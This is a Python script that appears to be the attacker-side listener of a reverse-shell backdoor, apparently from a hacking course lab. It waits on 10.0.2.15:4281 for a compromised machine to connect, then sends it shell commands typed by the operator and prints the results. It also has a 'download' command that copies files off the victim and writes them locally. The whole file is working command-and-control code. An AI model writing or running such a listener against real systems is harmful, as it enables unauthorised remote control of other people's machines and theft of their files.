import socket
import json
# json.dump is used to convert (normal--->json object)
# json.loads is used to convert (json object ---> normal)

class Listener:
	def __init__(self,ip,port):
		listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
		listener.bind((ip,port))
		listener.listen(0)
		print('[+] Waiting for connections...')
		self.connection, addr = listener.accept()
		print('[+] Connected to '+str(addr))

	def write_file(self,path,content):
		with open(path,'wb') as file:
			file.write(content)
			file.close()

		# with open(path,'rb') as f:
		# 	encoded = f.read()
		# 	f.close()

		# decoded = encoded.decode()

		# with open(path,'w') as file:
		# 	file.write(decoded)
		# 	file.close()

		return "[+] Download successful."



	def rel_send(self,data):
		json_data = json.dumps(data)
		self.connection.send(json_data.encode())

	def rel_recv(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except json.decoder.JSONDecodeError:
				continue

	def execute_remotely(self,command):
		self.rel_send(command)
		if(command[0]=='exit'):
			self.connection.close()
			exit()
		return self.rel_recv()

	def run(self):
		while True:
			command = input('>> ')
			command = command.split()
			result = self.execute_remotely(command)

			if(command[0]=='download'):
				print('Type of result =')
				result = self.write_file(command[1],result)


			print(result)

listener_obj = Listener('10.0.2.15',4281)
listener_obj.run()